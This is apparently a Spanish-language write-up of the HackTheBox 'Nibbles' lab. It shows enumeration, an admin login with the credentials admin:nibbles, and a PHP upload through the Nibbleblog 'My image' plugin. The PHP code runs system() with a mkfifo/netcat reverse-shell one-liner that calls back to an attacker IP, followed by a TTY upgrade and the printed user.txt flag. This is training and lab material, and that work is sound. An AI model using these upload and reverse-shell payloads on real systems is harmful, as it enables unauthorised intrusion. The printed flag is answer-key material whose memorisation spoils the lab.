## NIBBLES - FOOTHOLD INICIAL

Ahora que hemos iniciado sesión en el portal de administración, debemos intentar convertir este acceso en ejecución de código y, en última instancia, obtener acceso de shell inverso al servidor web. Sabemos que un módulo Metasploit probablemente funcionará para esto, pero enumeremos el portal de administración para otras vías de ataque. Mirando un poco alrededor, vemos las siguientes páginas:

| Pagina | Contenido|
| -- | -- |
|`Publish`| hacer una nueva publicación, publicación de video, publicación de citas o nueva página. Podría ser Interesante. |
| `Comments`| no muestra comentarios publicados | 
| `Manage`| Nos permite administrar publicaciones, páginas y categorías. Podemos editar y eliminar categorías, no demasiado interesantes.|
| `Settings` | Desplazarse hacia abajo confirma que la versión vulnerable 4.0.3 está en uso. Hay varias configuraciones disponibles, pero ninguna nos parece valiosa. |
| `Themes` | Esto nos permite instalar un nuevo tema de una lista preseleccionada. |
| `Plugins` | Nos permite configurar, instalar o desinstalar complementos. El complemento `My image` nos permite cargar un archivo de imagen. ¿Se podría abusar de esto para cargar código `PHP` potencialmente? |

Intentar crear una nueva página e incrustar código o cargar archivos no parece ser el camino. Echemos un vistazo a la página de plugins.

![](https://academy.hackthebox.com/storage/modules/77/plugins.png)

Intentemos usar este plugin para cargar un fragmento de código `PHP` en lugar de una imagen. El siguiente fragmento se puede usar para probar la ejecución del código.

~~~
<?php system('id'); ?>
~~~

Guarde este código en un archivo y luego haga clic en el botón `Browse` y cárguelo.

![](https://academy.hackthebox.com/storage/modules/77/upload.png)

Recibimos un montón de errores, pero parece que el archivo puede haberse cargado.

~~~
Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26

Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27

Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117

Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118

Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43

Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
~~~

Ahora tenemos que averiguar dónde se cargó el archivo si fue exitoso. Volviendo al directorio de resultados de fuerza bruta, recordamos el directorio `/content`. Debajo de esto, hay un directorio de `plugins` y otro subdirectorio para `my_image`. La ruta completa se encuentra en `http://<host>/nibbleblog/content/private/plugins/my_image/`. En este directorio, vemos dos archivos, `db.xml` e `image.php`, con una fecha de última modificación reciente, lo que significa que nuestra carga fue exitosa. Comprobemos y veamos si tenemos ejecución de comandos.

~~~
Juceco@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
~~~

¡lo hicimos! Parece que hemos ganado la ejecución remota de código en el servidor web y el servidor Apache se está ejecutando en el contexto de usuario de `nibbler`. Modifiquemos nuestro archivo PHP para obtener un shell inverso y comencemos a hurgar en el servidor.

Editemos nuestro archivo PHP local y volvamos a subirlo. Este comando debería darnos un shell inverso. Como se mencionó anteriormente en el Módulo, existen muchas hojas de trucos de shell inverso. Algunos excelentes son [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) y [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).

Usemos el siguiente shell inverso de `Bash` de una sola línea y agréguelo a nuestro script `PHP`.

~~~
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
~~~

Agregaremos nuestra dirección IP VPN `tun0` en el marcador de posición `<ATTACKING IP>` y un puerto de nuestra elección para `<LISTENING PORT>` para capturar el shell inverso en nuestro oyente `netcat`. Vea el script `PHP` editado a continuación.

~~~
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
~~~

Subimos de nuevo el archivo e iniciamos un `netcat` listener en nuestra terminal:

~~~
0xdf@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
~~~

usamos cURL para página de la imagen nuevamente o navegamos hasta ella en `Firefox` en http:///nibbleblog/content/private/plugins/my_image/image.php para ejecutar el shell inverso.

~~~
Juceco@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
~~~

Además, tenemos una reverse shell. Antes de continuar con la enumeración adicional, actualicemos nuestro shell a un shell "más agradable" ya que el shell que capturamos no es un TTY completamente interactivo y los comandos específicos como `su` no funcionarán, no podemos usar editores de texto, tabulador no funciona, etc. Esta [publicación](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explica el problema con más detalle, así como una variedad de formas de actualizar a un TTY completamente interactivo. Para nuestros propósitos, usaremos una sola línea de `Python` para generar un pseudo-terminal para que los comandos como `su` y `sudo` funcionen como se discutió anteriormente en este módulo.


Code: `Bash`
~~~
python -c 'import pty; pty.spawn("/bin/bash")'
~~~

Pruebe las diversas técnicas para actualizar a un TTY completo y elija la que mejor se adapte a sus necesidades. ¡Nuestro primer intento falla porque parece que falta `Python2` en el sistema!

~~~
$ python -c 'import pty; pty.spawn("/bin/bash")'

/bin/sh: 3: python: not found

$ which python3

/usr/bin/python3
~~~

Sin embargo, tenemos `Python3`, que funciona para llevarnos a un shell más amigable escribiendo `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Navegando a `/home/nibbler`, encontramos la flag `user.txt` así como un archivo zip `personal.zip`.

~~~
nibbler@Nibbles:/home/nibbler$ ls

ls
personal.zip  user.txt
~~~
___
### RETO
+ Obtenga un foothold en el objetivo y envíe la bandera user.txt

`R: 79c03865431abf47b90ef24b9695e148`

Al revisar los directorios observamos que tenemos admin.php en la direccion de nibbleblog
~~~
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.129.138.102/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.138.102/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/20 19:16:39 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 309]
/.hta                 (Status: 403) [Size: 304]
/.htpasswd            (Status: 403) [Size: 309]
/admin                (Status: 301) [Size: 327] [--> http://10.129.138.102/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]                                             
/content              (Status: 301) [Size: 329] [--> http://10.129.138.102/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]                                               
/languages            (Status: 301) [Size: 331] [--> http://10.129.138.102/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 329] [--> http://10.129.138.102/nibbleblog/plugins/]  
/README               (Status: 200) [Size: 4628]                                                 
/themes               (Status: 301) [Size: 328] [--> http://10.129.138.102/nibbleblog/themes/]   
Progress: 4059 / 4615 (87.95%)                                                
===============================================================
2022/07/20 19:17:45 Finished
===============================================================
~~~
![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/1.png)

ingresamos a nibbleblog para indagar
![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/2.png)

ingresamos al `admin.php`, en el ejercicio anterior pudimos obtener la contraseña y el usuario, `admin:nibbles`
![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/3.png)

En la pagina principal no observamos nada interesante, pero al lado izquierdo tenemos varias opciones,
 de las cuales la mas llamativa seria `plugins`
![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/4.png)

En `plugins` vemos una opcion para cargar una imagen si cargamos un `archivo.php` como prueba veremos que aunque da error permite cargarlo esto nos da la posibilidad de inyectar y ejecutar codigo php como una reverse shell
![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/5.png)

creamos un archivo con el codigo `<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc NUESTRA-IP 9443 >/tmp/f"); ?>` y lo guardamos como image.php en el ejemplo lo guarde como reverse-shell.php
![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/6.png)

![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/7.png)

Asignamos el puerto `9443` para que este a la escucha con `nc -lvnp 9443 `
~~~
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 9443             
listening on [any] 9443 ...
~~~

>en firefox http://DIRECCION-IP/nibbleblog/content/private/plugins/my_image/image.php para activar el reverse shell

una vez que corramos el codigo `.php` tendremos acceso
~~~
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 9443             
listening on [any] 9443 ...
                                                                              
connect to [10.10.14.93] from (UNKNOWN) [10.129.138.102] 46598                   
/bin/sh: 0: can't access tty; job control turned off                             
$ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)                       
$ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler) 
$
~~~

Vamos a cargar una `shell` para poder movernos con facilidad, cargaremos `python 3` y listamos para ver que conseguimos
~~~
$ python3 -c 'import pty; pty.spawn("/bin/bash")'                                
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ls    
ls                                                                               
db.xml  image.php
~~~

para resumir un poco, despues de revisar con `ls` y `cd`, descubri el directorio nibble asi que ingrese alli y consegui el archivo `user.txt`
~~~
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler                                                                       
<ml/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler                
nibbler@Nibbles:/home/nibbler$ ls                                                
ls                                                                               
personal.zip  user.txt
~~~

abrimos el archivo con `cat` y tenemos el codigo solicitado
~~~
nibbler@Nibbles:/home/nibbler$ cat user.txt                                      
cat user.txt                                                                     
79c03865431abf47b90ef24b9695e148                                                 
nibbler@Nibbles:/home/nibbler$
~~~